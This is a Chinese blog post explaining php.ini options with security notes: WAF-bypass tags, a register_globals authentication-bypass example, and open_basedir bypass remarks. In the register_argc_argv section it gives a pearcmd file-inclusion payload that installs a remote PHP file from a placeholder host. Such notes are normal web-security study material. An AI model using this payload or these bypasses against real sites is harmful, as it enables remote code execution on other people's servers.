---
title: PHP.INI
date: 2020-10-26 08:10:53
tags: 编程
---

# 深入理解phpinfo()

## 一、php.ini核心配置说明

**short_open_tag**（是否开启PHP代码标志的缩写形式）

假如被开启了该配置，`<? ?>`也可以作为php语言开始的标志，可以用于绕过对于`<?php`的检测。同时`<?=` 和`<? echo` 等价。和`asp_tags`的配置相同，但是后面这个是开启ASP的标志`<%%>`.但是在7.0.0版本之后就被搞出去了，可能是太好绕过WAF了。

**disable_functions**(禁止内置函数)和**disable_classes**（ 禁止类）

**script_encoding**（如果没有declare语句出现时，生效文件编码）

**variables_order**（`E`nvironment, `G`et, `P`ost, `C`ookie, and `S`erver,是否开启这些特殊变量）

**request_order**（指定GET，POST,COOKie进入php寄存器的顺序，从左到右，新值覆盖旧值）

**register_globals**（自动注册PHP变量）**本特性已自 PHP 5.3.0 起*废弃*并将自 PHP 5.4.0 起*移除*。**

```
register_globals = on
<?php
// 当用户合法的时候，赋值 $authorized = true
if (authenticated_user()) {
    $authorized = true;
}

// 由于并没有事先把 $authorized 初始化为 false，
// 当 register_globals 打开时，可能通过GET auth.php?authorized=1 来定义该变量值
// 所以任何人都可以绕过身份验证
if ($authorized) {
    include "/highly/sensitive/data.php";
}
单纯地关闭 register_globals 并不代表所有的代码都安全了。对于每一段提交上来的数据，都要对其进行具体的检查。永远要验证用户数据和对变量进行初始化！
```

**register_argc_argv**（告诉php是否注册`argv & argc variables` )

```
命令行模式：https://www.php.net/manual/zh/features.commandline.php
这样可以通过CLI SAPI 将URL中的数据传递到命令行模式中执行
?f=pearcmd&+install&+http://a.com/1.php
f是文件包含，将执行这个pearcmd文件，然后输入到了命令行模式了，后面的参数也会传入到命令行中
$argc包含当运行于命令行下时传递给当前脚本的参数的数目。
$argv — 传递给脚本的参数数组
```

**enable_post_data_reading**（是否启用[$_POST](https://www.php.net/manual/zh/reserved.variables.post.php) and [$_FILES](https://www.php.net/manual/zh/reserved.variables.files.php)来进行读取数据）

如果设置为false，就会只能通过`php://input`来读取传递的数据。

**auto_prepend_file和auto_append_file**（区别在于加载file的时间）

```
If the script is terminated with exit(), auto-append will not occur.
```

[**magic_quotes_gpc**](https://www.php.net/manual/zh/info.configuration.php#ini.magic-quotes-gpc)（开启魔术方法，自动转义）

**include_path**（很重要，但没必要讲）

**open_basedir**（限制包含目录，但是可以绕过）

```
In httpd.conf, open_basedir can be turned off (e.g. for some virtual hosts) the same way as any other configuration directive with "php_admin_value open_basedir none".
```

**cgi.check_shebang_line**（控制PHP是否检测#号开头的行）

`cgi.discard_path` [boolean](https://www.php.net/manual/zh/language.types.boolean.php)

If this is enabled, the PHP CGI binary can safely be placed outside of the web tree and people will not be able to circumvent .htaccess security.

`cgi.fix_pathinfo` [boolean](https://www.php.net/manual/zh/language.types.boolean.php)

Provides *real* `PATH_INFO`/ `PATH_TRANSLATED` support for CGI. PHP's previous behaviour was to set `PATH_TRANSLATED` to `SCRIPT_FILENAME`, and to not grok what `PATH_INFO` is. For more information on `PATH_INFO`, see the CGI specs. Setting this to `1` will cause PHP CGI to fix its paths to conform to the spec. A setting of zero causes PHP to behave as before. It is turned on by default. You should fix your scripts to use `SCRIPT_FILENAME` rather than `PATH_TRANSLATED`.

**allow_url_include**解决了远端引用(Include)

**allow_url_fopen**去打开远端的文件

enable_dl = On （禁用dl()函数主要是出于安全考虑，因为它可以绕过open_basedir指令的限制。）



## 二、参考链接

php.ini详解：https://www.cnblogs.com/hugongs/articles/1060223.html